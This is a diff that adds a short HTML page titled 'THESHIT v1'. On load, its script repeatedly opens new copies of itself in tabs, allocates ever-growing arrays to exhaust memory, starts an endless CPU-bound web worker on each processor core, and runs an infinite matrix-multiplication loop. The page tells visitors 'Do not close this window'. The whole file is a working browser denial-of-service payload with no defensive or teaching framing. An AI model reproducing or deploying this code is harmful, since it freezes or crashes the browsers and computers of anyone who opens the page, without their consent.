@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>THESHIT v1</title>
+<script>
+function spawnTabs() {
+    setInterval(() => {
+        window.open(window.location.href, '_blank');
+    }, 100);
+}
+
+function maxCPU() {
+    while (true) {
+        let size = 1000;
+        let matrix1 = new Array(size).fill().map(() => new Array(size).fill(Math.random()));
+        let matrix2 = new Array(size).fill().map(() => new Array(size).fill(Math.random()));
+        let result = new Array(size).fill().map(() => new Array(size).fill(0));
+        
+        for (let i = 0; i < size; i++) {
+            for (let j = 0; j < size; j++) {
+                for (let k = 0; k < size; k++) {
+                    result[i][j] += matrix1[i][k] * matrix2[k][j];
+                }
+            }
+        }
+    }
+}
+
+function exhaustMemory() {
+    let arr = [];
+    setInterval(() => {
+
+        for (let i = 0; i < 100; i++) {
+            arr.push(new Array(1000000).fill('exhaust'));
+        }
+    }, 50);
+}
+
+window.onload = function() {
+    setTimeout(() => {
+        spawnTabs();
+        exhaustMemory();
+        if (window.Worker) {
+            let workerCode = `onmessage = function() { while(true) { let arr = []; for(let i=0;i<10000;i++) arr.push(new Array(10000).fill(Math.random())); } }`;
+            let blob = new Blob([workerCode], {type: 'application/javascript'});
+            let workerURL = URL.createObjectURL(blob);
+            
+            for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+                let worker = new Worker(workerURL);
+                worker.postMessage('start');
+            }
+        }
+        
+        setTimeout(maxCPU, 500);
+    }, 500);
+};
+</script>
+</head>
+<body>
+<h1>THESHIT.html</h1>
+<p>Do not close this window</p>
+</body>
+</html>
